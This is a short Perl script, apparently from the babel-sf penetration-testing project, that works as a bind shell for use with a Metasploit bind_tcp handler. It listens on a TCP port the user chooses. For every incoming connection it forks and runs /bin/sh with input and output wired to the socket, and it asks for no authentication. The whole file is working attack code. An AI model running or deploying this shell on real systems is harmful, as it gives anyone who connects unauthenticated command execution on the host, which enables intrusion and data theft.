#!/usr/bin/perl
#
# msf-bind_tcp.pl version 0.1
#
# babel-sf ( https://github.com/attackdebris/babel-sf )
#

use POSIX qw(strftime);
use Socket;

my $date = strftime "%m-%d-%Y %H:%M", localtime;
my $num_args = $#ARGV + 1;
if ($num_args == 0 or $ARGV[0] eq "-h" or $ARGV[0] eq "--help" or $ARGV[0] eq "--h" or $ARGV[0] eq "-help") {
	print"msf-bind_tcp.pl - ( https://github.com/attackdebris/babel-sf )\n";
	print"[This script should be utilised with a linux/x86/shell/bind_tcp msf handler]\n";
	print"\nUsage:"; 
        print"\nperl msf-bind_tcp.pl [port number]";
	print"\nperl msf-bind_tcp.pl e.g. perl msf-bind_tcp.pl 8080\n";
}
elsif ($num_args != 1) {
	print"Only 1 argument is required, please check your syntax.\n";
}	
elsif ($num_args == 1) {
	$port = $ARGV[0];
	print"Starting msf-bind_tcp.pl ( https://github.com/attackdebris/babel-sf ) at $date\n";
	print"Listening on TCP port $port....\n";
	socket (S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));
	setsockopt (S, SOL_SOCKET, SO_REUSEADDR,1);
	bind (S, sockaddr_in ($port, INADDR_ANY));
	listen (S, 10);
     
	while (1){
	  accept (X, S);
	  if (!($pid = fork())){
	    if(!defined $pid){exit(0);}
	    open STDIN,"<&X";
	    open STDOUT,">&X";
	    open STDERR,">&X";
     	    exec("/bin/sh");
	    }
	 }
}